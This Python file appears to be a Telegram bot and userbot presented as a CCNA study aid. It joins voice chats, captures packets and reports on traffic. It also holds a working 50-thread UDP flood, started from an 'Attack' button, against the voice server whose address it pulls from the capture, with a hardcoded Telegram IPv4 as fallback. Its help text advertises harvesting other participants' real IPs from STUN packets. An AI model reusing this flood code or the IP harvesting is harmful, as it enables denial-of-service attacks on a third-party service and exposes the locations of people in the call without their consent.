"""
main.py — TG_NETWORK_capturer + Attack Module (AUTO IPv6)
════════════════════════════════════════════════════════════════════════
Telegram bot + userbot combo for CCNA learners.
Now auto‑detects the real IPv6 voice server from the pcap file
AFTER the first mic unmute to ensure voice packets are present.
"""

import asyncio
import os
import html
import json
import threading
import time
import socket
import random
import subprocess
import re
from datetime import datetime

from dotenv import load_dotenv
from pyrogram import Client
from pyrogram.raw import functions as tl_functions
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
)

from network_analyzer import NetworkCapture
from voice_chat_handler import VoiceChatHandler

load_dotenv()

# ─── Config ─────────────────────────────────────────────────────────────────
API_ID         = int(os.getenv("API_ID", "0"))
API_HASH       = os.getenv("API_HASH", "")
STRING_SESSION = os.getenv("STRING_SESSION", "")
BOT_TOKEN      = os.getenv("BOT_TOKEN", "")
OWNER_ID       = int(os.getenv("OWNER_ID", "0"))
TEST_DURATION  = int(os.getenv("TEST_DURATION", "60"))

# Attack defaults
ATTACK_THREADS = 50
ATTACK_PACKET_SIZE = 204
ATTACK_DELAY = 0.06

# ─── Pyrogram userbot ───────────────────────────────────────────────────────
userbot = Client(
    name="tg_capturer",
    api_id=API_ID,
    api_hash=API_HASH,
    session_string=STRING_SESSION,
)

# ─── Global state ───────────────────────────────────────────────────────────
voice_chat_handler: VoiceChatHandler | None   = None
voice_chats_cache:  dict[str, dict]           = {}
active_captures:    dict[int, NetworkCapture] = {}
attack_threads:      dict[int, list[threading.Thread]] = {}
attack_running:      dict[int, bool] = {}
attack_targets:      dict[int, tuple[str, int]] = {}


# ════════════════════════════════════════════════════════════════════════════
# New function: extract voice server from pcap
# ════════════════════════════════════════════════════════════════════════════

def extract_voice_server_from_pcap(pcap_path: str) -> tuple[str, int] | None:
    """
    Uses tshark to read the pcap file and returns the first
    destination IPv6 address and port for UDP packets to port 32001.
    """
    if not pcap_path or not os.path.exists(pcap_path):
        print("⚠️ No pcap file available.")
        return None

    cmd = [
        "tshark", "-r", pcap_path,
        "-Y", "udp.dstport == 32001",
        "-T", "fields", "-e", "ip.dst", "-e", "udp.dstport",
        "-c", "1"  # only first packet
    ]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
        if result.returncode == 0 and result.stdout.strip():
            parts = result.stdout.strip().split()
            if len(parts) >= 2:
                ip = parts[0]
                port = int(parts[1])
                print(f"✅ Extracted voice server from pcap: {ip}:{port}")
                return (ip, port)
        print("⚠️ No UDP packet to port 32001 found in pcap.")
    except Exception as e:
        print(f"⚠️ Error extracting from pcap: {e}")
    return None


# ════════════════════════════════════════════════════════════════════════════
# Attack Engine (unchanged)
# ════════════════════════════════════════════════════════════════════════════

def udp_flood(target_ip: str, target_port: int, stop_flag: callable, thread_id: int):
    sock = socket.socket(socket.AF_INET6 if ':' in target_ip else socket.AF_INET,
                         socket.SOCK_DGRAM)
    packet = bytes([random.randint(0, 255) for _ in range(ATTACK_PACKET_SIZE)])
    while not stop_flag():
        try:
            sock.sendto(packet, (target_ip, target_port))
        except Exception:
            pass
        time.sleep(ATTACK_DELAY)
    sock.close()


def start_attack(uid: int, target_ip: str, target_port: int, num_threads: int = ATTACK_THREADS):
    if uid in attack_running and attack_running[uid]:
        return False
    attack_running[uid] = True
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=udp_flood,
                             args=(target_ip, target_port,
                                   lambda: not attack_running.get(uid, False), i),
                             daemon=True)
        t.start()
        threads.append(t)
    attack_threads[uid] = threads
    return True


def stop_attack(uid: int):
    attack_running[uid] = False
    if uid in attack_threads:
        for t in attack_threads[uid]:
            t.join(timeout=1)
        del attack_threads[uid]


# ════════════════════════════════════════════════════════════════════════════
# Voice chat scanner (unchanged)
# ════════════════════════════════════════════════════════════════════════════

async def find_active_voice_chats() -> list[dict]:
    active = []
    async for dialog in userbot.get_dialogs():
        chat = dialog.chat
        if chat.type.value not in ("group", "supergroup", "channel"):
            continue
        try:
            peer = await userbot.resolve_peer(chat.id)
            # Supergroups / channels
            try:
                full = await userbot.invoke(
                    tl_functions.channels.GetFullChannel(channel=peer)
                )
                if getattr(full.full_chat, "call", None):
                    active.append({
                        "id":       chat.id,
                        "title":    chat.title or "Untitled",
                        "type":     chat.type.value,
                        "username": chat.username or "",
                    })
                    continue
            except Exception:
                pass
            # Legacy groups
            try:
                full = await userbot.invoke(
                    tl_functions.messages.GetFullChat(chat_id=abs(chat.id))
                )
                if getattr(full.full_chat, "call", None):
                    active.append({
                        "id":       chat.id,
                        "title":    chat.title or "Untitled",
                        "type":     chat.type.value,
                        "username": chat.username or "",
                    })
            except Exception:
                pass
        except Exception:
            continue
    return active


# ════════════════════════════════════════════════════════════════════════════
# Report formatter (unchanged)
# ════════════════════════════════════════════════════════════════════════════

def format_summary(vc_info: dict, r: dict) -> str:
    SEP = "═" * 35
    dc_lines = (
        "\n".join(f"  • <code>{ip}</code> → {dc}" for ip, dc in r["dc_connections"].items())
        or "  • ⚠️ No direct TG DC detected (VPN/proxy?)"
    )
    total = sum(r["protocols"].values()) or 1
    proto_lines = "\n".join(
        f"  • <b>{p}</b>: {c} ({c/total*100:.0f}%)"
        for p, c in sorted(r["protocols"].items(), key=lambda x: -x[1])
    ) or "  • None"
    top_app = sorted(r["port_protocols"].items(), key=lambda x: -x[1])[:5]
    app_lines = "\n".join(f"  • <code>{p}</code> → {c}" for p, c in top_app) or "  • None"
    ev_lines = "\n".join(
        f"  • <code>[{datetime.fromtimestamp(e['timestamp']).strftime('%H:%M:%S')}]</code>"
        f" +{e['timestamp']-r['start_time']:.0f}s — {e['event']}"
        for e in r["events"][-10:]
    ) or "  • None"
    return f"""
📡 <b>Network Capture Report</b>
🎙️ Voice Chat: <b>{html.escape(vc_info['title'])}</b>  <code>({vc_info['type']})</code>
{SEP}
📊 <b>Bandwidth</b>
  • Duration      : <code>{r['duration']:.1f} s</code>
  • Total Data    : <code>{r['total_bytes']/1024:.2f} KB</code>
  • ↑ Upload      : <code>{r['bytes_sent']/1024:.2f} KB</code>
  • ↓ Download    : <code>{r['bytes_recv']/1024:.2f} KB</code>
  • Avg Bandwidth : <code>{r['bandwidth_kbps']:.2f} Kbps</code>
  • ↑ Peak Upload : <code>{r['peak_kbps_up']:.1f} Kbps</code>
  • ↓ Peak Down   : <code>{r['peak_kbps_dn']:.1f} Kbps</code>
  • Total Packets : <code>{r['total_packets']}</code>
  • Avg PPS       : <code>{r['avg_pps']:.1f}</code> pkt/s
{SEP}
🏢 <b>Telegram Data Centers</b>
{dc_lines}
{SEP}
🔌 <b>Transport Layer</b> (TCP vs UDP)
{proto_lines}
{SEP}
🌐 <b>App-Layer Protocols</b> (by port)
{app_lines}
{SEP}
📅 <b>Event Timeline</b>
{ev_lines}
{SEP}
📚 <b>CCNA Quick Notes</b>
  • <b>TCP</b> → 3-way handshake, reliable
  • <b>UDP</b> → No handshake, low latency (voice ↑ PPS when mic ON)
  • <b>TLS/443</b> → MTProto encrypted inside
  • <b>STUN/3478</b> → NAT traversal for UDP voice
  • <b>TIME_WAIT</b> → Normal TCP close state (2×MSL)
  • <b>Ephemeral ports</b> → Client ports assigned by OS (>49152)
""".strip()


def build_vc_keyboard(vcs: list[dict]) -> tuple[dict, InlineKeyboardMarkup]:
    cache, rows = {}, []
    for i, vc in enumerate(vcs):
        key = str(i)
        cache[key] = vc
        rows.append([InlineKeyboardButton(
            f"🎙️ {vc['title'][:28]}  ({vc['type']})",
            callback_data=f"vc_{key}",
        )])
    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="refresh")])
    return cache, InlineKeyboardMarkup(rows)


# ════════════════════════════════════════════════════════════════════════════
# Bot handlers (unchanged)
# ════════════════════════════════════════════════════════════════════════════

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return

    msg = await update.message.reply_text(
        "🔍 Scanning all dialogs for active voice chats…\n"
        "_(May take a few seconds for accounts in many groups.)_",
        parse_mode="HTML",
    )

    try:
        vcs = await find_active_voice_chats()
    except Exception as e:
        await msg.edit_text(
            f"❌ Scan error:\n<code>{e}</code>",
            parse_mode="HTML"
        )
        return

    if not vcs:
        await msg.edit_text(
            "❌ No active voice chats found.\n"
            "Make sure your account is in a group/channel with an ongoing voice chat."
        )
        return

    global voice_chats_cache
    voice_chats_cache, markup = build_vc_keyboard(vcs)
    await msg.edit_text(
        f"✅ Found <b>{len(vcs)}</b> active voice chat(s).\nTap one to start:",
        reply_markup=markup,
        parse_mode="HTML",
    )


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    await update.message.reply_text(
        "🤖 <b>TG Network Capturer — Linux Edition</b>\n\n"
        "<b>Commands:</b>\n"
        "• <code>/start</code> — scan for active voice chats\n"
        "• <code>/help</code>  — show this\n\n"
        "<b>Automated test sequence:</b>\n"
        "1. Join voice chat (silent)\n"
        "2. Unmute mic × 3  →  see UDP PPS spike!\n"
        "3. Leave  →  see TIME_WAIT TCP state\n"
        "4. Rejoin →  see new handshake + DC IP\n"
        "5. Tap <b>Stop</b> → receive full report + .pcap file + JSON analysis\n\n"
        "<b>During capture you also have:</b>\n"
        "• <b>Attack</b> button — launch UDP flood against the voice server\n"
        "• <b>Stop Attack</b> button — halt the flood\n\n"
        "<b>Report contains:</b>\n"
        "• Bandwidth over time (Kbps + PPS per interval)\n"
        "• Telegram DC IPs detected\n"
        "• TCP vs UDP distribution\n"
        "• App-layer protocols (TLS, STUN, DNS…)\n"
        "• Connection states (ESTABLISHED, TIME_WAIT…)\n"
        "• All connection snapshots with IP:port pairs\n"
        "• STUN packets with XOR‑MAPPED‑ADDRESS (participants' real IPs)\n"
        "• RTP streams summary\n"
        "• CCNA study notes for every finding\n\n"
        "✅ Linux — uses tcpdump for packet capture and tshark for analysis",
        parse_mode="HTML",
    )


async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if update.effective_user.id != OWNER_ID:
        return

    data = query.data

    # ── Refresh ──────────────────────────────────────────────────────────────
    if data == "refresh":
        await query.edit_message_text("🔍 Refreshing…")
        try:
            vcs = await find_active_voice_chats()
        except Exception as e:
            await query.edit_message_text(
                f"❌ Error:\n<code>{e}</code>",
                parse_mode="HTML"
            )
            return
        if not vcs:
            await query.edit_message_text("❌ No active voice chats found.")
            return
        global voice_chats_cache
        voice_chats_cache, markup = build_vc_keyboard(vcs)
        await query.edit_message_text(
            f"✅ Found <b>{len(vcs)}</b> active voice chat(s):",
            reply_markup=markup,
            parse_mode="HTML",
        )
        return

    # ── Voice chat selected ──────────────────────────────────────────────────
    if data.startswith("vc_"):
        idx     = data[3:]
        vc_info = voice_chats_cache.get(idx)
        if not vc_info:
            await query.edit_message_text("❌ Cache expired — use /start again.")
            return

        await query.edit_message_text(
            f"🎙️ <b>{html.escape(vc_info['title'])}</b>\n\n"
            f"⏳ Starting automated test…\n"
            f"🔬 Network monitoring <b>active</b>\n\n"
            f"Steps: join → mic×3 → leave → rejoin\n"
            f"Use the buttons below to control capture and attack.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⏹️ Stop Capture", callback_data=f"close_{idx}")],
                [InlineKeyboardButton("⚔️ Attack", callback_data=f"attack_{idx}")],
                [InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack")]
            ]),
            parse_mode="HTML",
        )
        asyncio.create_task(_run_test(vc_info, context, idx))
        return

    # ── Attack ───────────────────────────────────────────────────────────────
    if data.startswith("attack_"):
        idx     = data[7:]
        vc_info = voice_chats_cache.get(idx)
        if not vc_info:
            await query.edit_message_text("❌ No active capture found.")
            return

        target = attack_targets.get(OWNER_ID)
        if not target:
            await query.edit_message_text("❌ No target server info. Did the join succeed?")
            return

        ip, port = target
        if start_attack(OWNER_ID, ip, port):
            await query.edit_message_text(
                f"⚔️ Attack started on {ip}:{port}\n"
                f"Threads: {ATTACK_THREADS}, Packet size: {ATTACK_PACKET_SIZE}, Delay: {ATTACK_DELAY}s\n"
                "Use 'Stop Attack' to halt.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("⏹️ Stop Capture", callback_data=f"close_{idx}")],
                    [InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack")]
                ]),
                parse_mode="HTML",
            )
        else:
            await query.edit_message_text("⚠️ Attack already running.")
        return

    # ── Stop Attack ──────────────────────────────────────────────────────────
    if data == "stop_attack":
        stop_attack(OWNER_ID)
        await query.edit_message_text("🛑 Attack stopped. Capture continues.")
        return

    # ── Stop Capture ─────────────────────────────────────────────────────────
    if data.startswith("close_"):
        idx     = data[6:]
        vc_info = voice_chats_cache.get(idx)
        if not vc_info:
            await query.edit_message_text("❌ No active test found.")
            return
        await query.edit_message_text(
            "⏹️ Stopping capture…\n📊 Generating report, please wait."
        )
        asyncio.create_task(_finalize(vc_info, context, OWNER_ID))


# ════════════════════════════════════════════════════════════════════════════
# Background tasks (UPDATED – extraction after first unmute)
# ════════════════════════════════════════════════════════════════════════════

async def _run_test(vc_info: dict, context: ContextTypes.DEFAULT_TYPE, idx: str):
    chat_id = vc_info["id"]
    capture = NetworkCapture(duration=TEST_DURATION, capture_packets=True)
    active_captures[OWNER_ID] = capture

    try:
        loop = asyncio.get_event_loop()
        capture_task = loop.run_in_executor(None, capture.start_capture)

        await context.bot.send_message(
            OWNER_ID,
            f"▶️ <b>Test started</b> for <b>{html.escape(vc_info['title'])}</b>\n"
            f"🔬 Network monitoring running…",
            parse_mode="HTML",
        )

        # Step 1 — Join
        await voice_chat_handler.join_voice_chat(chat_id)
        capture.log_event("voice_chat_joined", vc_info["title"])

        # Wait a bit for the call to establish
        await asyncio.sleep(2)

        # ---- First mic unmute (to generate voice packets) ----
        await voice_chat_handler.toggle_mic(chat_id, muted=False)
        capture.log_event("mic_unmuted", "Cycle 1/3 (for target detection)")
        await asyncio.sleep(3)  # let voice packets flow

        # --- Extract real voice server from the pcap file ---
        pcap_file = capture.get_pcap_file()
        if pcap_file:
            target = extract_voice_server_from_pcap(pcap_file)
            if target:
                global attack_targets
                attack_targets[OWNER_ID] = target
                server_ip, server_port = target
                await context.bot.send_message(
                    OWNER_ID,
                    f"✅ Target detected: {server_ip}:{server_port}\n"
                    f"(You can now launch the attack with the button)",
                    parse_mode="HTML",
                )
            else:
                # fallback to the known IPv4 (from your original)
                fallback_ip = "91.108.17.20"
                fallback_port = 32001
                attack_targets[OWNER_ID] = (fallback_ip, fallback_port)
                await context.bot.send_message(
                    OWNER_ID,
                    f"⚠️ Could not detect voice server from pcap.\n"
                    f"Falling back to known IPv4: {fallback_ip}:{fallback_port}",
                    parse_mode="HTML",
                )
        else:
            # fallback
            fallback_ip = "91.108.17.20"
            fallback_port = 32001
            attack_targets[OWNER_ID] = (fallback_ip, fallback_port)
            await context.bot.send_message(
                OWNER_ID,
                f"⚠️ No pcap file available.\n"
                f"Falling back to known IPv4: {fallback_ip}:{fallback_port}",
                parse_mode="HTML",
            )

        # ---- Continue with the rest of the mic cycles ----
        # Mute the first cycle (we already unmuted for detection)
        await voice_chat_handler.toggle_mic(chat_id, muted=True)
        capture.log_event("mic_muted", "Cycle 1/3")
        await asyncio.sleep(3)

        # Cycle 2
        await voice_chat_handler.toggle_mic(chat_id, muted=False)
        capture.log_event("mic_unmuted", "Cycle 2/3")
        await asyncio.sleep(4)
        await voice_chat_handler.toggle_mic(chat_id, muted=True)
        capture.log_event("mic_muted", "Cycle 2/3")
        await asyncio.sleep(3)

        # Cycle 3
        await voice_chat_handler.toggle_mic(chat_id, muted=False)
        capture.log_event("mic_unmuted", "Cycle 3/3")
        await asyncio.sleep(4)
        await voice_chat_handler.toggle_mic(chat_id, muted=True)
        capture.log_event("mic_muted", "Cycle 3/3")
        await asyncio.sleep(3)

        await context.bot.send_message(
            OWNER_ID,
            "✅ Step 2/4 — Mic toggle cycles complete\n"
            "(PPS spikes visible in the report when mic was ON)",
            parse_mode="HTML",
        )

        # Step 3 — Leave
        await voice_chat_handler.leave_voice_chat(chat_id)
        capture.log_event("voice_chat_left", "TCP FIN sent → TIME_WAIT expected")
        await asyncio.sleep(5)
        await context.bot.send_message(
            OWNER_ID,
            "✅ Step 3/4 — Left voice chat\n"
            "(Watch for TIME_WAIT connections in the report)",
            parse_mode="HTML",
        )

        # Step 4 — Rejoin
        await voice_chat_handler.join_voice_chat(chat_id)
        capture.log_event("voice_chat_rejoined", "New TCP handshake + DC IP")
        await asyncio.sleep(3)
        await context.bot.send_message(
            OWNER_ID,
            "✅ Step 4/4 — Rejoined voice chat\n\n"
            "🟢 <b>Sequence complete!</b> Monitoring still running.\n"
            "Use the buttons to start an attack or stop capture.",
            parse_mode="HTML",
        )

        await capture_task

    except Exception as exc:
        capture.stop_capture()
        await context.bot.send_message(
            OWNER_ID,
            f"❌ Test error:\n<code>{exc}</code>\n\nTap <b>Stop Capture</b> to get a partial report.",
            parse_mode="HTML",
        )
        try:
            await voice_chat_handler.leave_voice_chat(chat_id)
        except Exception:
            pass


async def _finalize(vc_info: dict, context: ContextTypes.DEFAULT_TYPE, user_id: int):
    chat_id = vc_info["id"]
    capture = active_captures.get(user_id)

    if not capture:
        await context.bot.send_message(user_id, "❌ No active capture found.")
        return

    try:
        capture.stop_capture()
        try:
            await voice_chat_handler.leave_voice_chat(chat_id)
        except Exception:
            pass
        stop_attack(user_id)

        report_data = capture.get_report()
        summary     = format_summary(vc_info, report_data)

        ts         = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_title = vc_info["title"][:20].replace(" ", "_").replace("/", "-")
        filename   = f"tg_capture_{safe_title}_{ts}.txt"
        capture.export_to_file(filename)

        for chunk in [summary[i:i+4096] for i in range(0, len(summary), 4096)]:
            await context.bot.send_message(
                user_id,
                chunk,
                parse_mode="HTML",
            )

        with open(filename, "rb") as fh:
            await context.bot.send_document(
                user_id,
                document=fh,
                filename=filename,
                caption=(
                    f"📄 Full capture: <b>{html.escape(vc_info['title'])}</b>\n"
                    f"Contains bandwidth timeline, all connection snapshots,\n"
                    f"DC IPs, port-level protocols, and CCNA study notes."
                ),
                parse_mode="HTML",
            )
        os.remove(filename)

        json_filename = f"analysis_{safe_title}_{ts}.json"
        capture.export_analysis_json(json_filename)
        with open(json_filename, "rb") as f:
            await context.bot.send_document(
                user_id,
                document=f,
                filename=json_filename,
                caption="📊 Detailed pcap analysis (STUN, RTP, UDP conversations).",
            )
        os.remove(json_filename)

        pcap_file = capture.get_pcap_file()
        if pcap_file and os.path.exists(pcap_file):
            with open(pcap_file, "rb") as f:
                await context.bot.send_document(
                    user_id,
                    document=f,
                    filename=os.path.basename(pcap_file),
                    caption=f"📦 Raw UDP packet capture for {html.escape(vc_info['title'])}.\nOpen in Wireshark to see the actual voice packets."
                )
            os.remove(pcap_file)

        del active_captures[user_id]

        await context.bot.send_message(
            user_id,
            "✅ Done! Files sent.",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔄 Scan again", callback_data="refresh")
            ]]),
            parse_mode="HTML",
        )

    except Exception as exc:
        await context.bot.send_message(
            user_id,
            f"❌ Report error:\n<code>{exc}</code>",
            parse_mode="HTML",
        )


# ════════════════════════════════════════════════════════════════════════════
# Entry point (unchanged)
# ════════════════════════════════════════════════════════════════════════════

async def main():
    global voice_chat_handler

    print("═" * 60)
    print("  TG_NETWORK_capturer — Starting up (Linux Edition)")
    print("═" * 60)

    missing = [k for k, v in {
        "API_ID": API_ID, "API_HASH": API_HASH,
        "STRING_SESSION": STRING_SESSION,
        "BOT_TOKEN": BOT_TOKEN, "OWNER_ID": OWNER_ID,
    }.items() if not v]

    if missing:
        print(f"❌ Missing config values: {', '.join(missing)}")
        print("   Check your .env file and run generate_session.py if needed.")
        return

    await userbot.start()
    me = await userbot.get_me()
    print(f"✅ Userbot started  → @{me.username}  (id: {me.id})")

    voice_chat_handler = VoiceChatHandler(userbot)
    await voice_chat_handler.start()
    print("✅ Voice chat handler ready")

    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", cmd_start))
    application.add_handler(CommandHandler("help",  cmd_help))
    application.add_handler(CallbackQueryHandler(callback_handler))

    print(f"✅ Bot running — send /start to your bot in Telegram")
    print(f"   Test duration: {TEST_DURATION}s")
    print("═" * 60)

    async with application:
        await application.start()
        await application.updater.start_polling(drop_pending_updates=True)
        print("Polling started — press Ctrl+C to stop")
        await asyncio.Event().wait()
        await application.updater.stop()
        await application.stop()

    await userbot.stop()


if __name__ == "__main__":
    asyncio.run(main())
